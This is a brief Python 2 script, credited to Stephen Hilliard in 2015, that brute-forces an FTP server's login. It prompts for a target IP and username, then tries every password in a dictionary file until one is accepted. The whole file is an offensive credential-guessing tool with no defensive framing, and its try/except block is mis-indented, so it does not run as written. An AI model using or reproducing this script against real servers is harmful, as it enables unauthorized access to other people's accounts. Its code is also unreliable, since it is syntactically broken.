'''
author Stephen Hilliard (c) 2015.
developer Stephen Hilliard (c) 2015.
'''
from ftplib import FTP
import os
import time

print "\n\t\t"
print "\t\t"
print "\n[+]PLEASE ENTER TARGET IP-ADDRESS E.G. 192.168.0.1"
h=raw_input("\n[+] PLEASE ENTER HOST : ")
ftp = FTP(h)

i=raw_input("\n[+] PLEASE ENTER USERNAME :")
fobj = open('password_dictionary.txt','r')

for pas in fobj:
	p= pas.rstrip()
	print"[+] TRYING :",i,p
	try:
		if ftp.login(i,p):
			print "\n\n\n[+]PASSWORD FOUND : ",p,"\n\n\n"
			break
		except:
			time.sleep(3)

fobj.close()
raw_input("\n[+]PRESS ANY KEY TO QUIT")